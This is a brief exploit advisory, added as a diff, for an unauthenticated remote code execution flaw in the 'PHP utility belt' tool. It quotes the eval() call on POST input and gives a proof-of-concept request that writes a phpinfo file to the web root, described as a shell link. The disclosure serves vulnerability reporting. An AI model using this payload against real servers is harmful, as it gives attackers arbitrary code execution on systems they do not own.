@@ -1,0 +1,28 @@
+Exploit Title : PHP utility belt Remote Code Execution vulnerability
+Author         : WICS
+Date             : 8/12/2015
+Software Link  : https://github.com/mboynes/php-utility-belt
+
+Overview:
+
+
+PHP utility belt is a set of tools for PHP developers. Install in a browser-accessible directory and have at it.
+ajax.php is accessible without any authentication 
+
+Vulnerable code (Line number 12 to 15)
+
+if ( isset( $_POST['code'] ) ) {
+  if ( false === eval( $_POST['code'] ) )
+    echo 'PHP Error encountered, execution halted';
+}
+
+
+POC
+Access URL 
+http://127.0.0.1/php-utility-belt/ajax.php
+in Post data type 
+code=fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');
+
+above code will generate info.php file which will display php info
+Shell link will be 
+http://127.0.0.1/php-utility-belt/info.php
